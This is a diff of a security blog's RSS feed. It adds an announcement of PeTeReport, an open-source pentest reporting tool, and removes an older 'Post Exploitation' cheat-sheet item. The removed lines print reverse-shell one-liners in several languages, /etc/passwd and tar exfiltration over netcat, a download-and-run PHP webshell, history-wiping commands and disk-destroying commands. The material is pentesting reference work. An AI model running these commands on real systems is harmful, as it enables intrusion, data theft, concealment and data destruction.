@@ -5,9 +5,75 @@
     <description>M</description>
     <link>https://1modm.github.io/</link>
     <atom:link href="https://1modm.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 27 Mar 2021 13:47:28 +0000</pubDate>
-    <lastBuildDate>Sat, 27 Mar 2021 13:47:28 +0000</lastBuildDate>
+    <pubDate>Thu, 11 Nov 2021 13:22:58 +0000</pubDate>
+    <lastBuildDate>Thu, 11 Nov 2021 13:22:58 +0000</lastBuildDate>
     <generator>Jekyll v4.1.1</generator>
+    
+      <item>
+        <title>Petereport</title>
+        <description>&lt;p&gt;yout: post
+title: PeTeReport
+description: Pentesting content management and reporting tool
+keywords: Pentesting PeTeReport reporting tool
+—&lt;/p&gt;
+
+&lt;p&gt;The amount of time writing the report during an assessment could frustrate everybody, a good looking report it is necessary to correctly capture the discovered findings. While I was testing other great reporting tools like &lt;a href=&quot;https://github.com/certmichelin/PTART&quot;&gt;PTART&lt;/a&gt;, &lt;a href=&quot;https://github.com/blacklanternsecurity/writehat&quot;&gt;writehat&lt;/a&gt; or &lt;a href=&quot;https://github.com/pwndoc/pwndoc&quot;&gt;pwndoc&lt;/a&gt; I didn’t found the one that could cover all our needs. So why not to do it yourself?&lt;/p&gt;
+
+&lt;p&gt;To manage the data I used django, for the PDF reporting &lt;a href=&quot;https://github.com/noraj/OSCP-Exam-Report-Template-Markdown&quot;&gt;OSCP-Exam-Report-Template-Markdown&lt;/a&gt; and &lt;a href=&quot;https://pandoc.org/&quot;&gt;pandoc&lt;/a&gt;, for the frontend &lt;a href=&quot;https://adminlte.io/&quot;&gt;AdminLTE&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;petereport&quot;&gt;PeTeReport&lt;/h2&gt;
+
+&lt;p&gt;PeTeReport (&lt;strong&gt;Pe&lt;/strong&gt;n&lt;strong&gt;Te&lt;/strong&gt;st &lt;strong&gt;Report&lt;/strong&gt;) is an open-source application vulnerability reporting tool designed to assist pentesting/redteaming efforts, by simplifying the task of writting and generation of reports.&lt;/p&gt;
+
+&lt;p&gt;Focused in product security, the tool help security researchers and pentesters to provide detailed findings, appendix, attack paths and manage a finding template database to avoid wasting time spent in the reporting phase.&lt;/p&gt;
+
+&lt;p&gt;PeTeReport (&lt;strong&gt;Pe&lt;/strong&gt;n&lt;strong&gt;Te&lt;/strong&gt;st &lt;strong&gt;Report&lt;/strong&gt;) is written in Django and Python 3 with the aim to help pentesters to manage a finding repository, write reports (in Markdown) and generate reports in different formats (HTML, CSV, PDF, Jupyter and Markdown).&lt;/p&gt;
+
+&lt;h4 align=&quot;center&quot;&gt;Pentesting content management and reporting tool&lt;/h4&gt;
+
+&lt;h1 align=&quot;center&quot;&gt;
+  &lt;br /&gt;
+  &lt;a href=&quot;https://github.com/1modm/petereport&quot;&gt;&lt;img src=&quot;https://github.com/1modm/petereport/raw/main/images/dashboard.png&quot; alt=&quot;petereport&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/a&gt;
+  &lt;br /&gt;
+&lt;/h1&gt;
+
+&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://1modm.github.io/petereport/&quot;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;installation-and-deployment&quot;&gt;Installation and deployment&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://1modm.github.io/petereport/docker/&quot;&gt;Docker&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://1modm.github.io/petereport/django/&quot;&gt;Django&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;features&quot;&gt;Features&lt;/h2&gt;
+
+&lt;ul class=&quot;task-list&quot;&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Customizable reports output&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Customizable reports templates&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Findings template database&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Possibility to add appendix to findings&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Possibility to add attack trees &lt;a href=&quot;https://www.deciduous.app/&quot;&gt;Deciduous&lt;/a&gt; to findings&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;HTML Output format&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;CSV Output format&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;PDF Output format&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Jupyter Notebook Output format&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Markdown Output format&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;CVSS 3.1 Score&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Docker installation&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;DefectDojo integration&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;User management&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Fri, 05 Nov 2021 00:00:00 +0000</pubDate>
+        <link>https://1modm.github.io/PeteReport.html</link>
+        <guid isPermaLink="true">https://1modm.github.io/PeteReport.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>Fuzzing ICS protocols</title>
@@ -2645,130 +2711,6 @@ Destination IP: 192.168.1.1 - Destination port: 80 - MAC: a4:42:7b:56:b6:23
         <pubDate>Thu, 21 Sep 2017 00:00:00 +0100</pubDate>
         <link>https://1modm.github.io/Dshell_Penetration-Exploit-Hijacking_decoders.html</link>
         <guid isPermaLink="true">https://1modm.github.io/Dshell_Penetration-Exploit-Hijacking_decoders.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Post Exploitation</title>
-        <description>&lt;p&gt;The Post Exploitation phase will determine the control of the machine compromised and will maintain the control for later use.&lt;/p&gt;
-
-&lt;h3 id=&quot;netcat-reverse-shells&quot;&gt;Netcat Reverse Shells&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Windows: nc.exe 192.168.1.1 4444 -e cmd.exe
-Linux: nc 192.168.1.1 4444 -e /bin/bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.1/4444 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;192.168.1.1&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.1 4444 &amp;gt;/tmp/f
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:4444 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;send-files&quot;&gt;Send files&lt;/h3&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;send-files-through-netcat&quot;&gt;Send Files through Netcat&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat 192.168.1.1 4444 &amp;lt; original_file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat 192.168.1.1 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;file-upload-in-windows-with-powershell&quot;&gt;File upload in Windows with PowerShell&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/&quot;&gt;[Windows / DOS / PowerShell] File upload in command line&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;php-webshells&quot;&gt;PHP webshells&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/JohnTroony/php-webshells&quot;&gt;php-webshells&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;covering-the-tracks&quot;&gt;Covering the tracks&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Avoiding history&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Clear history&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
-touch .bash_history (invasive)
-history -c
-set +o history
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Destroy&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
-find / -type f -exec {} 
-mkfs.ext3 /dev/sda
-dd if=/dev/zero of=/dev/sda bs=1M
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells&quot;&gt;escaping-restricted-linux-shells&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.kernel-exploits.com/&quot;&gt;kernel-exploits&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/andrew-d/static-binaries&quot;&gt;static-binaries&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Sun, 16 Jul 2017 00:00:00 +0100</pubDate>
-        <link>https://1modm.github.io/Post-Exploitation.html</link>
-        <guid isPermaLink="true">https://1modm.github.io/Post-Exploitation.html</guid>
         
         
       </item>
